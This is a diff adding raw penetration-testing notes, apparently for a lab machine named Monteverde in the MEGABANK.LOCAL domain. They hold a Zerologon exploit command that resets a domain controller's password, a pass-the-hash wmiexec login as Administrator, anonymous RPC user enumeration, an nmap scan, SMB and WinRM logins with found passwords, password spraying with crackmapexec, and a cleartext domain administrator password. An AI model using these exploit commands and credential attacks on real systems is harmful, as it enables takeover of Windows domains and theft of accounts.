@@ -1,0 +1,75 @@
+Zerologon
+python3 set_empty_pw.py MONTEVERDE 10.129.149.143
+/home/george93/impacket/examples/wmiexec.py WORKGROUP/Administrator@10.129.149.143 -hashes aad3b435b51404eeaad3b435b51404ee:100a42db8caea588a626d3a9378cd7ea
+
+
+
+user:[Guest] rid:[0x1f5]
+user:[AAD_987d7f2f57d2] rid:[0x450]
+user:[mhope] rid:[0x641]
+user:[SABatchJobs] rid:[0xa2a]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[svc-netapp] rid:[0xa2d]
+user:[dgalanos] rid:[0xa35]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+
+└─$ rpcclient -U '' -N 10.129.211.80
+
+
+└─$ nmap -sC -sV -Pn 10.129.211.80 
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-01 03:05 +08
+Stats: 0:01:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.80% done; ETC: 03:06 (0:00:00 remaining)
+Nmap scan report for 10.129.211.80
+Host is up (0.30s latency).
+Not shown: 989 filtered ports
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-28 19:05:33Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 1s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-02-28T19:06:03
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 107.73 seconds
+
+
+smbclient //10.129.211.80/users$ -U SABatchJobs SABatchJobs
+
+smbclient -N //10.129.211.80/users$ -U "SABatchJobs" -P "SABatchJobs"
+
+
+crackmapexec winrm 10.129.211.80 -u mhope -p '4n0therD4y@n0th3r$'
+
+crackmapexec smb 10.129.211.80 -u USERNAMELIST -p PASSWORDLIST
+
+evil-winrm -u mhope -p '4n0therD4y@n0th3r$' -i 10.129.211.80
+
+Domain: MEGABANK.LOCAL
+Username: administrator
+Password: d0m@in4dminyeah!
+
+
+
+
+
+
